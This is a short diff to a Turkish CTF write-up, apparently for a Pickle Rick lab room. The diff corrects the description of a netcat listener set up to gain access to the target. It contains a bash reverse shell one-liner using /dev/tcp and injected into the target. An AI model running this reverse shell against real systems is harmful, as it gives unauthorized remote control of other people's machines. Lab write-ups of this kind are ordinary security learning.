@@ -23,7 +23,7 @@ Kulanıcı adı : R1ckRul3s         |
 ===============================================================================|
 ERİŞİM ELEDE ETME                                                              |
                                                                                |
-nc -lnvp => hedef cihazda netcat açtım                                         |
+nc -lnvp 12345 => kendi  cihazımda netcat açtım                                |
                                                                                |
 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1' => payloadı enjekte edtim  |
                                                                                |
